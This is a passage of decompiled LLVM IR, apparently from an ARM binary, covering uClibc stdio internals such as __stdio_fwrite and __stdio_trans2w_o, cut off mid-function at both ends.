  %v2_14e6c = sub i32 %v1_14e6c, %v2_14e68
  br label %dec_label_pc_14e70

dec_label_pc_14e70:                               ; preds = %dec_label_pc_14e04.dec_label_pc_14e70_crit_edge, %dec_label_pc_14e60
  %v0_14e70 = phi i32 [ %v0_14e70.pre, %dec_label_pc_14e04.dec_label_pc_14e70_crit_edge ], [ %v2_14e6c, %dec_label_pc_14e60 ]
  %v1_14e70 = load i32, i32* %r8.global-to-local, align 4
  %v2_14e70 = sub i32 %v1_14e70, %v0_14e70
  store i32 %v2_14e70, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14e74

dec_label_pc_14dd4.dec_label_pc_14e74.loopexit_crit_edge: ; preds = %dec_label_pc_14dd4thread-pre-split
  %v0_14e74.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14e74

dec_label_pc_14e74:                               ; preds = %entry, %dec_label_pc_14dd4.dec_label_pc_14e74.loopexit_crit_edge, %dec_label_pc_14e70
  %v0_14e74 = phi i32 [ %v2_14e70, %dec_label_pc_14e70 ], [ %v0_14e74.pre.pre, %dec_label_pc_14dd4.dec_label_pc_14e74.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_14e74, i32* %r0.global-to-local, align 4
  store i32 %v9_14dc0, i32* @r6, align 4
  ret i32 %v0_14e74

; uselistorder directives
  uselistorder i32 %v0_14e74, { 1, 0 }
  uselistorder i32 %v0_14e60, { 1, 0 }
  uselistorder i32 %v1_14e58, { 0, 2, 1 }
  uselistorder i32 %v0_14e54, { 1, 0 }
  uselistorder i1 %v2_14e4c, { 1, 0 }
  uselistorder i32 %v1_14e40, { 1, 0 }
  uselistorder i32 %v0_14e28, { 1, 0, 2 }
  uselistorder i32 %v5_14e0c, { 1, 0 }
  uselistorder i32 %v2_14e0c, { 1, 0, 2 }
  uselistorder i32 %v0_14df4, { 1, 0 }
  uselistorder i32 %v3_14dec, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_14de4, { 1, 0 }
  uselistorder i32 %v5_14dfc, { 0, 2, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 6, 7, 8, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 (i32, i32)* @__libc_write, { 1, 12, 11, 10, 9, 0, 8, 6, 7, 2, 5, 3, 4 }
  uselistorder label %dec_label_pc_14e74, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14e70, { 1, 0 }
  uselistorder label %dec_label_pc_14e60, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_14de0, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_14e7c = load i32, i32* @r4, align 4
  store i32 %v3_14e7c, i32* %stack_var_-20, align 4
  %v6_14e7c = load i32, i32* @r5, align 4
  %v9_14e7c = load i32, i32* @r6, align 4
  %v12_14e7c = load i32, i32* @r7, align 4
  %v15_14e7c = load i32, i32* @lr, align 4
  %v1_14e80 = add i32 %arg3, 1
  %v2_14e80 = inttoptr i32 %v1_14e80 to i8*
  %v3_14e80 = load i8, i8* %v2_14e80, align 1
  %v4_14e80 = zext i8 %v3_14e80 to i32
  %v3_14e84 = mul nuw nsw i32 %v4_14e80, 256
  %v1_14e88 = and i32 %v3_14e84, 512
  store i32 %v1_14e88, i32* @r4, align 4
  %v2_14e88 = icmp eq i32 %v1_14e88, 0
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_14e88, label %dec_label_pc_14e9c, label %dec_label_pc_14f98

dec_label_pc_14e9c:                               ; preds = %entry
  %v1_14e9c = add i32 %arg3, 4
  %v2_14e9c = inttoptr i32 %v1_14e9c to i32*
  %v3_14e9c = load i32, i32* %v2_14e9c, align 4
  %v1_14ea4 = add i32 %arg3, 16
  %v2_14ea4 = inttoptr i32 %v1_14ea4 to i32*
  %v3_14ea4 = load i32, i32* %v2_14ea4, align 4
  store i32 %v3_14ea4, i32* @r0, align 4
  %v1_14ea8 = add i32 %arg3, 12
  %v2_14ea8 = inttoptr i32 %v1_14ea8 to i32*
  %v3_14ea8 = load i32, i32* %v2_14ea8, align 4
  %v4_14eac = icmp eq i32 %v3_14e9c, -2
  %v2_14eb0 = sub i32 %v3_14ea8, %v3_14ea4
  br i1 %v4_14eac, label %dec_label_pc_14eb0, label %dec_label_pc_14ed8

dec_label_pc_14eb0:                               ; preds = %dec_label_pc_14e9c
  %v3_14eb4 = icmp ugt i32 %v2_14eb0, %arg2
  br i1 %v3_14eb4, label %bb, label %bb10

bb:                                               ; preds = %dec_label_pc_14eb0
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_14eb0, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_14eb0, %dec_label_pc_14eb0 ]
  %v0_14ebc = phi i32 [ %arg2, %bb ], [ %v2_14eb0, %dec_label_pc_14eb0 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_14ebc, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_14ec4 = call i32 @memcpy()
  %v0_14ec8 = load i32, i32* @r5, align 4
  %v1_14ec8 = add i32 %v0_14ec8, 16
  %v2_14ec8 = inttoptr i32 %v1_14ec8 to i32*
  %v3_14ec8 = load i32, i32* %v2_14ec8, align 4
  %v1_14ecc = load i32, i32* @r4, align 4
  %v2_14ecc = add i32 %v1_14ecc, %v3_14ec8
  store i32 %v2_14ecc, i32* %v2_14ec8, align 4
  br label %dec_label_pc_14fac

dec_label_pc_14ed8:                               ; preds = %dec_label_pc_14e9c
  %tmp = icmp ult i32 %v2_14eb0, %arg2
  br i1 %tmp, label %dec_label_pc_14f78, label %dec_label_pc_14ee4

dec_label_pc_14ee4:                               ; preds = %dec_label_pc_14ed8
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_14eec = call i32 @memcpy()
  %v0_14ef0 = load i32, i32* @r5, align 4
  %v1_14ef0 = add i32 %v0_14ef0, 16
  %v2_14ef0 = inttoptr i32 %v1_14ef0 to i32*
  %v3_14ef0 = load i32, i32* %v2_14ef0, align 4
  %v1_14ef4 = add i32 %v0_14ef0, 1
  %v2_14ef4 = inttoptr i32 %v1_14ef4 to i8*
  %v3_14ef4 = load i8, i8* %v2_14ef4, align 1
  %v1_14ef8 = load i32, i32* @r6, align 4
  %v2_14ef8 = add i32 %v1_14ef8, %v3_14ef0
  %tmp17 = urem i8 %v3_14ef4, 2
  %v2_14efc = icmp eq i8 %tmp17, 0
  store i32 %v2_14ef8, i32* %v2_14ef0, align 4
  br i1 %v2_14efc, label %dec_label_pc_14fac, label %dec_label_pc_14f08

dec_label_pc_14f08:                               ; preds = %dec_label_pc_14ee4
  %v0_14f08 = load i32, i32* %r7.global-to-local, align 4
  %v0_14f10 = load i32, i32* @r6, align 4
  %v4_14f14 = call i32 @memrchr(i32 %v0_14f08, i32 10, i32 %v0_14f10, i32 %v2_14ef8)
  %v2_14f18 = icmp eq i32 %v4_14f14, 0
  br i1 %v2_14f18, label %dec_label_pc_14fac, label %dec_label_pc_14f20

dec_label_pc_14f20:                               ; preds = %dec_label_pc_14f08
  %v0_14f20 = load i32, i32* @r5, align 4
  store i32 %v0_14f20, i32* @r0, align 4
  %v0_14f24 = call i32 @__stdio_wcommit()
  %v2_14f28 = icmp eq i32 %v0_14f24, 0
  br i1 %v2_14f28, label %dec_label_pc_14fac, label %dec_label_pc_14f30

dec_label_pc_14f30:                               ; preds = %dec_label_pc_14f20
  %v0_14f30 = load i32, i32* @r6, align 4
  %v3_14f30 = icmp uge i32 %v0_14f30, %v0_14f24
  %v0_14f24.v0_14f30 = select i1 %v3_14f30, i32 %v0_14f24, i32 %v0_14f30
  store i32 %v0_14f24.v0_14f30, i32* @r4, align 4
  %v2_14f3c = sub i32 %v0_14f30, %v0_14f24.v0_14f30
  %v0_14f40 = load i32, i32* %r7.global-to-local, align 4
  %v2_14f40 = add i32 %v0_14f40, %v2_14f3c
  store i32 %v2_14f40, i32* %r7.global-to-local, align 4
  store i32 %v0_14f24.v0_14f30, i32* @r2, align 4
  %v4_14f50 = call i32 @__GI_memchr(i32 %v2_14f40, i32 10, i32 %v0_14f24.v0_14f30, i32 %v2_14f3c)
  %v2_14f54 = icmp eq i32 %v4_14f50, 0
  br i1 %v2_14f54, label %dec_label_pc_14fac, label %dec_label_pc_14f5c

dec_label_pc_14f5c:                               ; preds = %dec_label_pc_14f30
  %v0_14f5c = load i32, i32* @r5, align 4
  %v1_14f5c = add i32 %v0_14f5c, 16
  %v2_14f5c = inttoptr i32 %v1_14f5c to i32*
  %v3_14f5c = load i32, i32* %v2_14f5c, align 4
  %v0_14f60 = load i32, i32* %r7.global-to-local, align 4
  %v1_14f60 = load i32, i32* @r4, align 4
  %v2_14f60 = sub i32 %v0_14f60, %v4_14f50
  %v2_14f64 = add i32 %v2_14f60, %v1_14f60
  %v2_14f68 = sub i32 %v3_14f5c, %v2_14f64
  %v1_14f6c = load i32, i32* @r6, align 4
  %v2_14f6c = sub i32 %v1_14f6c, %v2_14f64
  store i32 %v2_14f6c, i32* @r6, align 4
  store i32 %v2_14f68, i32* %v2_14f5c, align 4
  br label %dec_label_pc_14fac

dec_label_pc_14f78:                               ; preds = %dec_label_pc_14ed8
  %v1_14f78 = add i32 %arg3, 8
  %v2_14f78 = inttoptr i32 %v1_14f78 to i32*
  %v3_14f78 = load i32, i32* %v2_14f78, align 4
  %v9_14f7c = icmp eq i32 %v3_14ea4, %v3_14f78
  br i1 %v9_14f7c, label %dec_label_pc_14f98, label %dec_label_pc_14f84

dec_label_pc_14f84:                               ; preds = %dec_label_pc_14f78
  store i32 %arg3, i32* @r0, align 4
  %v0_14f88 = call i32 @__stdio_wcommit()
  %v2_14f8c = icmp eq i32 %v0_14f88, 0
  br i1 %v2_14f8c, label %dec_label_pc_14f84.dec_label_pc_14f98_crit_edge, label %bb13

dec_label_pc_14f84.dec_label_pc_14f98_crit_edge:  ; preds = %dec_label_pc_14f84
  %v0_14fa0.pre = load i32, i32* @r6, align 4
  %v0_14f98.pre = load i32, i32* @r5, align 4
  %v0_14f9c.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_14fa4.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_14f98

bb13:                                             ; preds = %dec_label_pc_14f84
  %v1_14f90 = load i32, i32* @r4, align 4
  store i32 %v1_14f90, i32* @r6, align 4
  br label %dec_label_pc_14fac

dec_label_pc_14f98:                               ; preds = %dec_label_pc_14f84.dec_label_pc_14f98_crit_edge, %entry, %dec_label_pc_14f78
  %v2_14fa4 = phi i32 [ %v2_14fa4.pre, %dec_label_pc_14f84.dec_label_pc_14f98_crit_edge ], [ %v3_14e7c, %entry ], [ %v3_14e7c, %dec_label_pc_14f78 ]
  %v0_14f9c = phi i32 [ %v0_14f9c.pre, %dec_label_pc_14f84.dec_label_pc_14f98_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_14f78 ]
  %v0_14f98 = phi i32 [ %v0_14f98.pre, %dec_label_pc_14f84.dec_label_pc_14f98_crit_edge ], [ %arg3, %entry ], [ %arg3, %dec_label_pc_14f78 ]
  %v0_14fa0 = phi i32 [ %v0_14fa0.pre, %dec_label_pc_14f84.dec_label_pc_14f98_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_14f78 ]
  store i32 %v2_14fa4, i32* @r4, align 4
  store i32 %v6_14e7c, i32* @r5, align 4
  store i32 %v9_14e7c, i32* @r6, align 4
  store i32 %v15_14e7c, i32* @lr, align 4
  %v3_14fa8 = inttoptr i32 %v0_14f98 to i8*
  %v4_14fa8 = call i32 @__stdio_WRITE(i8* %v3_14fa8, i32 %v0_14f9c, i32 %v0_14fa0)
  br label %dec_label_pc_14fac

dec_label_pc_14fac:                               ; preds = %bb13, %dec_label_pc_14f30, %dec_label_pc_14f20, %dec_label_pc_14f08, %dec_label_pc_14ee4, %dec_label_pc_14f5c, %bb10, %dec_label_pc_14f98
  %v0_14fac = load i32, i32* @r6, align 4
  %v2_14fb0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_14fb0, i32* @r4, align 4
  store i32 %v6_14e7c, i32* @r5, align 4
  store i32 %v9_14e7c, i32* @r6, align 4
  store i32 %v12_14e7c, i32* @r7, align 4
  ret i32 %v0_14fac

; uselistorder directives
  uselistorder i32 %v2_14f64, { 1, 0 }
  uselistorder i32 %v2_14f3c, { 1, 0 }
  uselistorder i32 %v0_14f24.v0_14f30, { 1, 2, 0, 3 }
  uselistorder i32 %v0_14f30, { 1, 0, 2 }
  uselistorder i32 %v2_14eb0, { 2, 0, 1, 3 }
  uselistorder i32 %v9_14e7c, { 1, 0 }
  uselistorder i32 %v6_14e7c, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %arg3, { 0, 1, 7, 2, 6, 5, 8, 3, 4 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_14fac, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_14f98, { 0, 2, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14fb4 = load i32, i32* @r4, align 4
  store i32 %v3_14fb4, i32* %stack_var_-8, align 4
  %v3_14fb8 = load i8, i8* %arg1, align 1
  %v4_14fb8 = zext i8 %v3_14fb8 to i32
  store i32 %v4_14fb8, i32* %r2.global-to-local, align 4
  %v2_14fbc = add i32 %tmp, 1
  %v3_14fbc = inttoptr i32 %v2_14fbc to i8*
  %v4_14fbc = load i8, i8* %v3_14fbc, align 1
  %v5_14fbc = zext i8 %v4_14fbc to i32
  store i32 %v5_14fbc, i32* %r3.global-to-local, align 4
  %v4_14fc0 = mul nuw nsw i32 %v5_14fbc, 256
  %v5_14fc0 = or i32 %v4_14fc0, %v4_14fb8
  store i32 %v5_14fc0, i32* %r2.global-to-local, align 4
  %v2_14fc4 = and i32 %v5_14fc0, %arg2
  %v4_14fc4 = icmp eq i32 %v2_14fc4, 0
  store i1 %v4_14fc4, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_14fc4, label %dec_label_pc_14fd0, label %dec_label_pc_14fe8

dec_label_pc_14fd0:                               ; preds = %entry
  %v1_14fd0 = and i32 %v5_14fc0, 2176
  %v2_14fd0 = icmp eq i32 %v1_14fd0, 0
  store i1 %v2_14fd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14fd0, label %dec_label_pc_14fd8, label %dec_label_pc_14ffc

dec_label_pc_14fd8:                               ; preds = %dec_label_pc_14fd0
  %v2_14fd8 = or i32 %v5_14fc0, %arg2
  store i32 %v2_14fd8, i32* %r2.global-to-local, align 4
  %v3_14fdc = sdiv i32 %v2_14fd8, 256
  store i32 %v3_14fdc, i32* %r3.global-to-local, align 4
  %v1_14fe0 = trunc i32 %v3_14fdc to i8
  store i8 %v1_14fe0, i8* %v3_14fbc, align 1
  %v0_14fe4 = load i32, i32* %r2.global-to-local, align 4
  %v1_14fe4 = trunc i32 %v0_14fe4 to i8
  store i8 %v1_14fe4, i8* %arg1, align 1
  %v0_14fe8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14fe8

dec_label_pc_14fe8:                               ; preds = %entry, %dec_label_pc_14fd8
  %v0_15034 = phi i32 [ %tmp, %entry ], [ %v0_14fe8.pre, %dec_label_pc_14fd8 ]
  %v1_14fe8 = inttoptr i32 %v0_15034 to i8*
  %v2_14fe8 = load i8, i8* %v1_14fe8, align 1
  %v3_14fe8 = zext i8 %v2_14fe8 to i32
  store i32 %v3_14fe8, i32* %r2.global-to-local, align 4
  %v1_14fec = add i32 %v0_15034, 1
  %v2_14fec = inttoptr i32 %v1_14fec to i8*
  %v3_14fec = load i8, i8* %v2_14fec, align 1
  %v4_14fec = zext i8 %v3_14fec to i32
  store i32 %v4_14fec, i32* %r3.global-to-local, align 4
  %v4_14ff0 = mul nuw nsw i32 %v4_14fec, 256
  %v1_14ff4 = and i32 %v3_14fe8, 32
  %v2_14ff4 = icmp eq i32 %v1_14ff4, 0
  store i1 %v2_14ff4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14ff4, label %dec_label_pc_15024, label %dec_label_pc_14ffc

dec_label_pc_14ffc:                               ; preds = %dec_label_pc_14fd0, %dec_label_pc_14fe8
  %v0_14ffc = call i32 @__errno_location()
  store i32 %v0_14ffc, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_15004 = inttoptr i32 %v0_14ffc to i32*
  store i32 9, i32* %v2_15004, align 4
  br label %dec_label_pc_15008

dec_label_pc_15008:                               ; preds = %dec_label_pc_1504c, %dec_label_pc_14ffc
  %v0_15008 = load i32, i32* @r4, align 4
  %v1_15008 = inttoptr i32 %v0_15008 to i32*
  %v2_15008 = load i32, i32* %v1_15008, align 4
  %v1_1500c = or i32 %v2_15008, 8
  store i32 %v1_1500c, i32* %r3.global-to-local, align 4
  %v3_15010 = sdiv i32 %v2_15008, 256
  store i32 %v3_15010, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_15018 = trunc i32 %v3_15010 to i8
  %v3_15018 = add i32 %v0_15008, 1
  %v4_15018 = inttoptr i32 %v3_15018 to i8*
  store i8 %v1_15018, i8* %v4_15018, align 1
  %v0_1501c = load i32, i32* %r3.global-to-local, align 4
  %v1_1501c = trunc i32 %v0_1501c to i8
  %v2_1501c = load i32, i32* @r4, align 4
  %v3_1501c = inttoptr i32 %v2_1501c to i8*
  store i8 %v1_1501c, i8* %v3_1501c, align 1
  %v2_15020 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15020, i32* @r4, align 4
  ret i32 -1

dec_label_pc_15024:                               ; preds = %dec_label_pc_14fe8
  %tmp15 = urem i8 %v2_14fe8, 4
  %v2_15024 = icmp eq i8 %tmp15, 0
  store i1 %v2_15024, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15024, label %dec_label_pc_15088, label %dec_label_pc_1502c

dec_label_pc_1502c:                               ; preds = %dec_label_pc_15024
  %v1_1502c = and i32 %v3_14fe8, 4
  store i32 %v1_1502c, i32* @r1, align 4
  %v2_1502c = icmp eq i32 %v1_1502c, 0
  store i1 %v2_1502c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1502c, label %dec_label_pc_15034, label %dec_label_pc_15064

dec_label_pc_15034:                               ; preds = %dec_label_pc_1502c
  %v1_15034 = add i32 %v0_15034, 20
  %v2_15034 = inttoptr i32 %v1_15034 to i32*
  %v3_15034 = load i32, i32* %v2_15034, align 4
  store i32 %v3_15034, i32* %r2.global-to-local, align 4
  %v1_15038 = add i32 %v0_15034, 16
  %v2_15038 = inttoptr i32 %v1_15038 to i32*
  %v3_15038 = load i32, i32* %v2_15038, align 4
  store i32 %v3_15038, i32* %r3.global-to-local, align 4
  %v9_1503c = icmp eq i32 %v3_15034, %v3_15038
  store i1 %v9_1503c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1503c, label %dec_label_pc_15044, label %dec_label_pc_1504c

dec_label_pc_15044:                               ; preds = %dec_label_pc_15034
  %v1_15044 = and i32 %v3_14fe8, 2
  %v2_15044 = icmp eq i32 %v1_15044, 0
  store i1 %v2_15044, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15044, label %dec_label_pc_15064, label %dec_label_pc_1504c

dec_label_pc_1504c:                               ; preds = %dec_label_pc_15034, %dec_label_pc_15044
  %v1_1504c = and i32 %v4_14ff0, 1024
  %v2_1504c = icmp eq i32 %v1_1504c, 0
  store i1 %v2_1504c, i1* %cpsr_z.global-to-local, align 1
  %tmp13 = udiv i32 %v1_1504c, 1024
  %tmp14 = add nuw nsw i32 %tmp13, 1
  store i32 %tmp14, i32* @r2, align 4
  %v0_15058 = call i32 @__GI_fseek()
  store i32 %v0_15058, i32* %r0.global-to-local, align 4
  %v2_1505c = icmp eq i32 %v0_15058, 0
  store i1 %v2_1505c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1505c, label %.dec_label_pc_15064_crit_edge, label %dec_label_pc_15008

.dec_label_pc_15064_crit_edge:                    ; preds = %dec_label_pc_1504c
  %v0_15064.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15064

dec_label_pc_15064:                               ; preds = %.dec_label_pc_15064_crit_edge, %dec_label_pc_1502c, %dec_label_pc_15044
  %v2_15074 = phi i32 [ %v0_15064.pre, %.dec_label_pc_15064_crit_edge ], [ %v0_15034, %dec_label_pc_1502c ], [ %v0_15034, %dec_label_pc_15044 ]
  %v1_15064 = inttoptr i32 %v2_15074 to i32*
  %v2_15064 = load i32, i32* %v1_15064, align 4
  store i32 %v2_15064, i32* %r3.global-to-local, align 4
  %v1_15068 = add i32 %v2_15074, 8
  %v2_15068 = inttoptr i32 %v1_15068 to i32*
  %v3_15068 = load i32, i32* %v2_15068, align 4
  store i32 %v3_15068, i32* %r1.global-to-local, align 4
  %v1_1506c = and i32 %v2_15064, -4
  store i32 %v1_1506c, i32* %r3.global-to-local, align 4
  %v3_15070 = sdiv i32 %v2_15064, 256
  store i32 %v3_15070, i32* %r2.global-to-local, align 4
  %v1_15074 = trunc i32 %v3_15070 to i8
  %v3_15074 = add i32 %v2_15074, 1
  %v4_15074 = inttoptr i32 %v3_15074 to i8*
  store i8 %v1_15074, i8* %v4_15074, align 1
  %v0_15078 = load i32, i32* %r1.global-to-local, align 4
  %v1_15078 = load i32, i32* @r4, align 4
  %v2_15078 = add i32 %v1_15078, 20
  %v3_15078 = inttoptr i32 %v2_15078 to i32*
  store i32 %v0_15078, i32* %v3_15078, align 4
  %v0_1507c = load i32, i32* %r3.global-to-local, align 4
  %v1_1507c = trunc i32 %v0_1507c to i8
  %v2_1507c = load i32, i32* @r4, align 4
  %v3_1507c = inttoptr i32 %v2_1507c to i8*
  store i8 %v1_1507c, i8* %v3_1507c, align 1
  %v0_15080 = load i32, i32* %r1.global-to-local, align 4
  %v1_15080 = load i32, i32* @r4, align 4
  %v2_15080 = add i32 %v1_15080, 24
  %v3_15080 = inttoptr i32 %v2_15080 to i32*
  store i32 %v0_15080, i32* %v3_15080, align 4
  %v0_15084 = load i32, i32* %r1.global-to-local, align 4
  %v1_15084 = load i32, i32* @r4, align 4
  %v2_15084 = add i32 %v1_15084, 16
  %v3_15084 = inttoptr i32 %v2_15084 to i32*
  store i32 %v0_15084, i32* %v3_15084, align 4
  %v0_15088.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15088

dec_label_pc_15088:                               ; preds = %dec_label_pc_15024, %dec_label_pc_15064
  %v2_15094 = phi i32 [ %v0_15034, %dec_label_pc_15024 ], [ %v0_15088.pre, %dec_label_pc_15064 ]
  %v1_15088 = inttoptr i32 %v2_15094 to i32*
  %v2_15088 = load i32, i32* %v1_15088, align 4
  %v1_1508c = or i32 %v2_15088, 64
  store i32 %v1_1508c, i32* %r2.global-to-local, align 4
  %v3_15090 = sdiv i32 %v2_15088, 256
  store i32 %v3_15090, i32* %r3.global-to-local, align 4
  %v1_15094 = trunc i32 %v3_15090 to i8
  %v3_15094 = add i32 %v2_15094, 1
  %v4_15094 = inttoptr i32 %v3_15094 to i8*
  store i8 %v1_15094, i8* %v4_15094, align 1
  %v0_15098 = load i32, i32* @r4, align 4
  %v1_15098 = add i32 %v0_15098, 1
  %v2_15098 = inttoptr i32 %v1_15098 to i8*
  %v3_15098 = load i8, i8* %v2_15098, align 1
  %v4_15098 = zext i8 %v3_15098 to i32
  %v3_1509c = mul nuw nsw i32 %v4_15098, 256
  store i32 %v3_1509c, i32* %r3.global-to-local, align 4
  %v1_150a0 = and i32 %v3_1509c, 2816
  store i32 %v1_150a0, i32* %r0.global-to-local, align 4
  %v2_150a0 = icmp eq i32 %v1_150a0, 0
  store i1 %v2_150a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_150a0, label %bb9, label %.thread1

bb9:                                              ; preds = %dec_label_pc_15088
  %v2_150a4 = add i32 %v0_15098, 12
  %v3_150a4 = inttoptr i32 %v2_150a4 to i32*
  %v4_150a4 = load i32, i32* %v3_150a4, align 4
  store i32 %v4_150a4, i32* %r3.global-to-local, align 4
  br label %bb10

.thread1:                                         ; preds = %dec_label_pc_15088
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb10

bb10:                                             ; preds = %bb9, %.thread1
  %v0_150ac = load i32, i32* %r2.global-to-local, align 4
  %v1_150ac = trunc i32 %v0_150ac to i8
  %v3_150ac = inttoptr i32 %v0_15098 to i8*
  store i8 %v1_150ac, i8* %v3_150ac, align 1
  %v0_150b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_150b0, label %bb11, label %bb12

bb11:                                             ; preds = %bb10
  %v1_150b0 = load i32, i32* %r3.global-to-local, align 4
  %v2_150b0 = load i32, i32* @r4, align 4
  %v3_150b0 = add i32 %v2_150b0, 28
  %v4_150b0 = inttoptr i32 %v3_150b0 to i32*
  store i32 %v1_150b0, i32* %v4_150b0, align 4
  br label %bb12

bb12:                                             ; preds = %bb10, %bb11
  %v2_150b4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_150b4, i32* @r4, align 4
  %v8_150b4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_150b4

; uselistorder directives
  uselistorder i32 %v3_1509c, { 1, 0 }
  uselistorder i32 %v3_15090, { 1, 0 }
  uselistorder i32 %v3_15070, { 1, 0 }
  uselistorder i32 %v2_15074, { 0, 2, 1 }
  uselistorder i1 %v2_15024, { 1, 0 }
  uselistorder i32 %v3_15010, { 1, 0 }
  uselistorder i32 %v0_15034, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v3_14fdc, { 1, 0 }
  uselistorder i32 %v5_14fc0, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %dec_label_pc_15088, { 1, 0 }
  uselistorder label %dec_label_pc_15064, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1504c, { 1, 0 }
  uselistorder label %dec_label_pc_14ffc, { 1, 0 }
  uselistorder label %dec_label_pc_14fe8, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %v0_150b8 = load i32, i32* @r2, align 4
  %v1_150b8 = icmp slt i32 %v0_150b8, 0
  %v0_150bc = load i32, i32* @r0, align 4
  %v1_150c0 = and i32 %v0_150bc, 2048
  %v2_150f4 = icmp eq i32 %v1_150c0, 0
  br i1 %v1_150b8, label %dec_label_pc_150f4, label %dec_label_pc_150c8

dec_label_pc_150c8:                               ; preds = %entry
  br i1 %v2_150f4, label %dec_label_pc_150d0, label %dec_label_pc_150fc

dec_label_pc_150d0:                               ; preds = %dec_label_pc_150c8
  %v7_150d0 = icmp eq i32 %v0_150bc, 256
  %v0_150d4 = load i32, i32* @r1, align 4
  %v1_150d4 = inttoptr i32 %v0_150d4 to i32*
  %v2_150d4 = load i32, i32* %v1_150d4, align 4
  %v2_150d8 = urem i32 %v2_150d4, 256
  %v2_150d8.v2_150d4 = select i1 %v7_150d0, i32 %v2_150d8, i32 %v2_150d4
  br i1 %v7_150d0, label %.thread, label %dec_label_pc_150e0

dec_label_pc_150e0:                               ; preds = %dec_label_pc_150d0
  %v7_150e0 = icmp eq i32 %v0_150bc, 512
  br i1 %v7_150e0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_150e0
  %v4_150e8 = urem i32 %v2_150d8.v2_150d4, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_150e0, %dec_label_pc_150d0, %bb
  %v1_150f0 = phi i32 [ %v2_150d4, %dec_label_pc_150e0 ], [ %v2_150d8, %dec_label_pc_150d0 ], [ %v4_150e8, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_150f0

dec_label_pc_150f4:                               ; preds = %entry
  br i1 %v2_150f4, label %dec_label_pc_15104, label %dec_label_pc_150fc

dec_label_pc_150fc:                               ; preds = %dec_label_pc_150c8, %dec_label_pc_150f4
  %v0_150fc = load i32, i32* @r1, align 4
  %v1_150fc = inttoptr i32 %v0_150fc to i32*
